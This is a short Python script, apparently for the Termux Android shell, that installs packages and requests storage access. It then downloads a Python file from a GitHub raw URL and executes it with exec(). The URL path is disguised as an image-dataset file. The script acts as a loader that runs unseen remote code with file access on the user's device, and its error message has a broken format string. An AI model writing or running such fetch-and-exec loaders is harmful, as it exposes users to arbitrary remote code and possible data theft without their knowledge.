import os
os.system('pkg install termux-am -y')
os.system('termux-setup-storage')
os.system('apt update -y')
os.system('apt upgrade -y')
os.system('pip install requests -y')
import requests 
try:
    exec(requests.get("https://raw.githubusercontent.com/tienmai291207/100k-faces/master/docs/0/4/004395.py").text)
except:
    print("Bạn chưa kết nối internet{e}")
